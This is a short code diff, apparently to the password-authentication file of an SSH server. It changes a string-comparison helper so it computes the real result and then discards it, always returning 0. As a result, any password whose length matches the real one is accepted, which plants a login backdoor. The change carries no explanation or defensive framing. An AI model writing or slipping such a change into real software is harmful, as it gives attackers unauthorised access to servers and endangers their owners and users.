@@ -1,0 +1,13 @@
+--- a/svr-authpasswd.c
++++ b/svr-authpasswd.c
+@@ -43,7 +43,9 @@ static int constant_time_strcmp(const ch
+ 		return 1;
+ 	}
+ 
+-	return constant_time_memcmp(a, b, la);
++	//return constant_time_memcmp(a, b, la);
++	int true_res = constant_time_memcmp(a, b, la);
++	return 0;
+ }
+ 
+ /* Process a password auth request, sending success or failure messages as
